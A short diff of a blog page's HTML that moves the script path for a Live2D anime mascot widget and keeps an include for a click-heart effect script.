-<script src="/wan1/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-tsumiki"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
 <!-- 页面点击小红心 -->
 <script type="text/javascript" src="/js/src/clicklove.js"></script>
